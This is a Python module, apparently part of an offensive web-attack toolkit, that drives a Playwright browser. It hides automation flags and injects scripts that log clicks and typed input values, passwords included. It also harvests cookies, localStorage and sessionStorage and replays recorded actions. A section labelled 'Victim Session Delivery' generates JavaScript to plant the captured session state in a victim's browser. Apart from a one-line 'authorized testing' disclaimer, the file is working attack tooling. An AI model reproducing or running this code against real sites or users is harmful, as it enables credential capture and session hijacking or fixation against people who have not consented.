"""
Browser Session Recording & Replay Engine

Provides:
- Real browser control with Playwright
- Session state capture (cookies, localStorage, sessionStorage)
- Macro recording (clicks, typing, navigation)
- Session restoration for victims
- Macro replay

For authorized security testing only.
"""

import asyncio
import json
import logging
import uuid
import base64
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field, asdict
from pathlib import Path

logger = logging.getLogger(__name__)

# Try to import playwright
try:
    from playwright.async_api import async_playwright, Browser, BrowserContext, Page
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False
    logger.warning("Playwright not installed. Run: pip install playwright && playwright install chromium")


@dataclass
class MacroAction:
    """A recorded user action"""
    action_type: str  # click, type, navigate, scroll, wait, screenshot
    timestamp: str
    selector: Optional[str] = None
    value: Optional[str] = None
    url: Optional[str] = None
    x: Optional[int] = None
    y: Optional[int] = None
    description: str = ""


@dataclass
class RecordedMacro:
    """A recorded macro (sequence of actions)"""
    id: str
    name: str
    target_url: str
    actions: List[MacroAction] = field(default_factory=list)
    created_at: str = ""
    description: str = ""


@dataclass
class SavedSession:
    """A saved browser session state"""
    id: str
    name: str
    target_url: str
    cookies: List[Dict] = field(default_factory=list)
    local_storage: Dict[str, str] = field(default_factory=dict)
    session_storage: Dict[str, str] = field(default_factory=dict)
    current_url: str = ""
    screenshot: Optional[str] = None  # Base64 encoded
    created_at: str = ""
    description: str = ""


class BrowserSessionManager:
    """Manages browser sessions for recording and replay"""

    def __init__(self):
        self._playwright = None
        self._browser: Optional[Browser] = None
        self._contexts: Dict[str, BrowserContext] = {}
        self._pages: Dict[str, Page] = {}
        self._recording: Dict[str, bool] = {}
        self._macros: Dict[str, RecordedMacro] = {}
        self._saved_sessions: Dict[str, SavedSession] = {}
        self._current_actions: Dict[str, List[MacroAction]] = {}

    async def init(self):
        """Initialize Playwright browser"""
        if not PLAYWRIGHT_AVAILABLE:
            raise RuntimeError("Playwright not installed. Run: pip install playwright && playwright install chromium")

        if self._browser:
            return

        self._playwright = await async_playwright().start()
        self._browser = await self._playwright.chromium.launch(
            headless=False,  # Show browser for operator
            args=[
                '--disable-blink-features=AutomationControlled',
                '--disable-infobars',
                '--window-size=1920,1080',
            ]
        )
        logger.info("Browser session manager initialized")

    async def cleanup(self):
        """Cleanup resources"""
        for context in self._contexts.values():
            await context.close()
        self._contexts.clear()
        self._pages.clear()

        if self._browser:
            await self._browser.close()
            self._browser = None

        if self._playwright:
            await self._playwright.stop()
            self._playwright = None

    # === Session Management ===

    async def create_session(self, target_url: str, session_name: str = "") -> Dict:
        """Create a new browser session for a target URL"""
        await self.init()

        session_id = str(uuid.uuid4())[:8]

        # Create browser context with realistic settings
        context = await self._browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            locale='en-US',
            timezone_id='America/New_York',
        )

        # Create page
        page = await context.new_page()

        # Store references
        self._contexts[session_id] = context
        self._pages[session_id] = page
        self._recording[session_id] = False
        self._current_actions[session_id] = []

        # Navigate to target
        await page.goto(target_url, wait_until='networkidle')

        logger.info(f"Created browser session {session_id} for {target_url}")

        return {
            'session_id': session_id,
            'name': session_name or f"Session {session_id}",
            'target_url': target_url,
            'current_url': page.url,
            'status': 'active'
        }

    async def get_session_info(self, session_id: str) -> Optional[Dict]:
        """Get info about a session"""
        if session_id not in self._pages:
            return None

        page = self._pages[session_id]
        return {
            'session_id': session_id,
            'current_url': page.url,
            'title': await page.title(),
            'recording': self._recording.get(session_id, False),
            'actions_count': len(self._current_actions.get(session_id, []))
        }

    async def close_session(self, session_id: str):
        """Close a browser session"""
        if session_id in self._contexts:
            await self._contexts[session_id].close()
            del self._contexts[session_id]
        if session_id in self._pages:
            del self._pages[session_id]
        if session_id in self._recording:
            del self._recording[session_id]
        if session_id in self._current_actions:
            del self._current_actions[session_id]

        logger.info(f"Closed browser session {session_id}")

    # === Recording ===

    async def start_recording(self, session_id: str) -> bool:
        """Start recording macro for a session"""
        if session_id not in self._pages:
            return False

        self._recording[session_id] = True
        self._current_actions[session_id] = []

        page = self._pages[session_id]

        # Add action listeners
        async def on_click(event):
            if self._recording.get(session_id):
                self._current_actions[session_id].append(MacroAction(
                    action_type='click',
                    timestamp=datetime.now().isoformat(),
                    x=event.get('x'),
                    y=event.get('y'),
                    description=f"Click at ({event.get('x')}, {event.get('y')})"
                ))

        # Expose recording function to page
        await page.expose_function('__recordAction', lambda action: self._record_action(session_id, action))

        # Inject recording script
        await page.add_init_script("""
            document.addEventListener('click', (e) => {
                if (window.__recordAction) {
                    window.__recordAction({
                        type: 'click',
                        selector: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.className ? '.' + e.target.className.split(' ').join('.') : ''),
                        x: e.clientX,
                        y: e.clientY,
                        text: e.target.innerText?.substring(0, 50)
                    });
                }
            }, true);

            document.addEventListener('input', (e) => {
                if (window.__recordAction && e.target.tagName === 'INPUT') {
                    window.__recordAction({
                        type: 'input',
                        selector: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.name ? '[name="' + e.target.name + '"]' : ''),
                        value: e.target.value
                    });
                }
            }, true);
        """)

        logger.info(f"Started recording for session {session_id}")
        return True

    def _record_action(self, session_id: str, action: Dict):
        """Record an action from the page"""
        if not self._recording.get(session_id):
            return

        macro_action = MacroAction(
            action_type=action.get('type', 'unknown'),
            timestamp=datetime.now().isoformat(),
            selector=action.get('selector'),
            value=action.get('value'),
            x=action.get('x'),
            y=action.get('y'),
            description=action.get('text', '')
        )
        self._current_actions[session_id].append(macro_action)
        logger.debug(f"Recorded action: {macro_action.action_type}")

    async def stop_recording(self, session_id: str, macro_name: str = "") -> Optional[str]:
        """Stop recording and save macro"""
        if session_id not in self._pages:
            return None

        self._recording[session_id] = False
        page = self._pages[session_id]

        # Create macro
        macro_id = str(uuid.uuid4())[:8]
        macro = RecordedMacro(
            id=macro_id,
            name=macro_name or f"Macro {macro_id}",
            target_url=page.url,
            actions=self._current_actions.get(session_id, []),
            created_at=datetime.now().isoformat()
        )
        self._macros[macro_id] = macro

        logger.info(f"Saved macro {macro_id} with {len(macro.actions)} actions")
        return macro_id

    # === Session State Capture ===

    async def save_session_state(self, session_id: str, name: str = "") -> Optional[str]:
        """Save the current session state (cookies, storage, screenshot)"""
        if session_id not in self._pages:
            return None

        page = self._pages[session_id]
        context = self._contexts[session_id]

        # Get cookies
        cookies = await context.cookies()

        # Get localStorage and sessionStorage
        storage_data = await page.evaluate("""() => {
            const local = {};
            const session = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                local[key] = localStorage.getItem(key);
            }
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                session[key] = sessionStorage.getItem(key);
            }
            return { localStorage: local, sessionStorage: session };
        }""")

        # Take screenshot
        screenshot_bytes = await page.screenshot(type='png')
        screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')

        # Create saved session
        saved_id = str(uuid.uuid4())[:8]
        saved_session = SavedSession(
            id=saved_id,
            name=name or f"Saved Session {saved_id}",
            target_url=page.url,
            cookies=cookies,
            local_storage=storage_data.get('localStorage', {}),
            session_storage=storage_data.get('sessionStorage', {}),
            current_url=page.url,
            screenshot=screenshot_b64,
            created_at=datetime.now().isoformat()
        )
        self._saved_sessions[saved_id] = saved_session

        logger.info(f"Saved session state {saved_id} with {len(cookies)} cookies")
        return saved_id

    async def restore_session_state(self, saved_id: str) -> Optional[str]:
        """Create a new session with restored state"""
        saved = self._saved_sessions.get(saved_id)
        if not saved:
            return None

        await self.init()

        session_id = str(uuid.uuid4())[:8]

        # Create context with saved cookies
        context = await self._browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        )

        # Add cookies
        if saved.cookies:
            await context.add_cookies(saved.cookies)

        # Create page
        page = await context.new_page()

        # Navigate to saved URL
        await page.goto(saved.current_url, wait_until='networkidle')

        # Restore localStorage and sessionStorage
        await page.evaluate("""(data) => {
            for (const [key, value] of Object.entries(data.localStorage || {})) {
                localStorage.setItem(key, value);
            }
            for (const [key, value] of Object.entries(data.sessionStorage || {})) {
                sessionStorage.setItem(key, value);
            }
        }""", {'localStorage': saved.local_storage, 'sessionStorage': saved.session_storage})

        # Refresh to apply storage
        await page.reload(wait_until='networkidle')

        self._contexts[session_id] = context
        self._pages[session_id] = page
        self._recording[session_id] = False
        self._current_actions[session_id] = []

        logger.info(f"Restored session {saved_id} as {session_id}")
        return session_id

    # === Macro Replay ===

    async def replay_macro(self, macro_id: str, session_id: Optional[str] = None) -> Optional[str]:
        """Replay a recorded macro"""
        macro = self._macros.get(macro_id)
        if not macro:
            return None

        # Create new session if not provided
        if not session_id:
            result = await self.create_session(macro.target_url)
            session_id = result['session_id']

        page = self._pages.get(session_id)
        if not page:
            return None

        # Replay actions
        for action in macro.actions:
            try:
                if action.action_type == 'click':
                    if action.selector:
                        await page.click(action.selector)
                    elif action.x is not None and action.y is not None:
                        await page.mouse.click(action.x, action.y)

                elif action.action_type == 'input' or action.action_type == 'type':
                    if action.selector and action.value:
                        await page.fill(action.selector, action.value)

                elif action.action_type == 'navigate':
                    if action.url:
                        await page.goto(action.url)

                elif action.action_type == 'wait':
                    await asyncio.sleep(float(action.value or 1))

                # Small delay between actions
                await asyncio.sleep(0.5)

            except Exception as e:
                logger.warning(f"Failed to replay action {action.action_type}: {e}")

        logger.info(f"Replayed macro {macro_id} with {len(macro.actions)} actions")
        return session_id

    # === Victim Session Delivery ===

    async def get_victim_session_data(self, saved_id: str) -> Optional[Dict]:
        """Get session data formatted for victim delivery"""
        saved = self._saved_sessions.get(saved_id)
        if not saved:
            return None

        return {
            'cookies': saved.cookies,
            'localStorage': saved.local_storage,
            'sessionStorage': saved.session_storage,
            'url': saved.current_url,
            'inject_script': self._generate_inject_script(saved)
        }

    def _generate_inject_script(self, saved: SavedSession) -> str:
        """Generate JS to inject session state into victim browser"""
        return f"""
(function() {{
    // Restore localStorage
    const localStorage_data = {json.dumps(saved.local_storage)};
    for (const [key, value] of Object.entries(localStorage_data)) {{
        localStorage.setItem(key, value);
    }}

    // Restore sessionStorage
    const sessionStorage_data = {json.dumps(saved.session_storage)};
    for (const [key, value] of Object.entries(sessionStorage_data)) {{
        sessionStorage.setItem(key, value);
    }}

    console.log('Session state restored');
}})();
"""

    # === Getters ===

    def get_macros(self) -> List[Dict]:
        """Get all saved macros"""
        return [
            {
                'id': m.id,
                'name': m.name,
                'target_url': m.target_url,
                'actions_count': len(m.actions),
                'created_at': m.created_at
            }
            for m in self._macros.values()
        ]

    def get_macro(self, macro_id: str) -> Optional[Dict]:
        """Get a specific macro"""
        macro = self._macros.get(macro_id)
        if not macro:
            return None
        return {
            'id': macro.id,
            'name': macro.name,
            'target_url': macro.target_url,
            'actions': [asdict(a) for a in macro.actions],
            'created_at': macro.created_at,
            'description': macro.description
        }

    def get_saved_sessions(self) -> List[Dict]:
        """Get all saved sessions"""
        return [
            {
                'id': s.id,
                'name': s.name,
                'target_url': s.target_url,
                'current_url': s.current_url,
                'cookies_count': len(s.cookies),
                'created_at': s.created_at,
                'has_screenshot': bool(s.screenshot)
            }
            for s in self._saved_sessions.values()
        ]

    def get_saved_session(self, saved_id: str) -> Optional[Dict]:
        """Get a specific saved session"""
        saved = self._saved_sessions.get(saved_id)
        if not saved:
            return None
        return {
            'id': saved.id,
            'name': saved.name,
            'target_url': saved.target_url,
            'current_url': saved.current_url,
            'cookies': saved.cookies,
            'local_storage': saved.local_storage,
            'session_storage': saved.session_storage,
            'screenshot': saved.screenshot,
            'created_at': saved.created_at,
            'description': saved.description
        }

    def delete_macro(self, macro_id: str) -> bool:
        """Delete a macro"""
        if macro_id in self._macros:
            del self._macros[macro_id]
            return True
        return False

    def delete_saved_session(self, saved_id: str) -> bool:
        """Delete a saved session"""
        if saved_id in self._saved_sessions:
            del self._saved_sessions[saved_id]
            return True
        return False


# Global instance
browser_session_manager = BrowserSessionManager()
